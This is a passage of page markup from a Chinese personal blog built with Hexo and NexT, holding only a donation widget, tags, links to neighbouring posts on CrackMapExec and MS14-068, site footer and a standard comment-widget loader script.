10.2903V8.62807H9.66202C9.11309 8.62807 8.66809 8.22248 8.66809 7.72216C8.66809 7.22183 9.11309 6.81624 9.66202 6.81624Z" fill="currentColor"></path></svg></div>
  <button>
    储钱罐
  </button>
  <div class="post-reward">
      <div>
        <img src="/assets/images/reward/images/wxpay.png" alt="57uv6Z6g 微信支付">
        <span>微信支付</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/alipay.png" alt="57uv6Z6g 支付宝">
        <span>支付宝</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/qqpay.png" alt="57uv6Z6g qqpay">
        <span>qqpay</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/bitcoin.png" alt="57uv6Z6g 比特币">
        <span>比特币</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/ethereum.png" alt="57uv6Z6g ethereum">
        <span>ethereum</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/monero.png" alt="57uv6Z6g monero">
        <span>monero</span>
      </div>
      <div>
        <img src="/assets/images/reward/images/paypal.png" alt="57uv6Z6g 贝宝">
        <span>贝宝</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Windows/" rel="tag"># Windows</a>
              <a href="/tags/Github/" rel="tag"># Github</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/11/13/CrackMapExec%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="【笔记】CrackMapExec学习笔记">
                  <i class="fa fa-angle-left"></i> 【笔记】CrackMapExec学习笔记
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/11/14/MS14-068%E4%BC%AA%E9%80%A0TGT%E5%87%AD%E6%8D%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="next" title="【笔记】MS14-068伪造TGT凭据漏洞利用">
                  【笔记】MS14-068伪造TGT凭据漏洞利用 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments"><div id="twikoo-comments"></div></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2019 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">57uv6Z6g</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>
<div id="site-time"></div>


<div id="current-visitors-count"></div>


<div id="site-badge"></div>


<div id="loading-door-left"></div>
<div id="loading-door-right"></div>
<a id="loading-door-a" href="javascript:loadingDoorOpen();">芝麻开门</a>


<div id="waifu">
  <div id="waifu-tips"></div>
  <canvas id="live2d" width="800" height="800"></canvas>
</div>
<div id="waifu-toggle">
  <span>看板娘</span>
</div>


<link rel="stylesheet" href="/dist/bundle.css">


<script src="/dist/bundle.js"></script>


    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>
<script class="next-config" data-name="twikoo" type="application/json">{"enable":true,"visitor":false,"envId":"https://twikoo.loli.fj.cn","jsUrl":"https://unpkg.com/twikoo@1.6.44/dist/twikoo.min.js","el":"#twikoo-comments"}</script>
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.twikoo.el)
    .then(() => NexT.utils.getScript(
      CONFIG.twikoo.jsUrl || 'https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js',
      { condition: window.twikoo }
    ))
    .then(() => {
      twikoo.init(CONFIG.twikoo);
    });
});
</script>
<style>
.post-block, .comments {
  overflow: visible;
}
.tk-owo-emotion {
  display: inline-block;
}
</style>

</body>
</html>
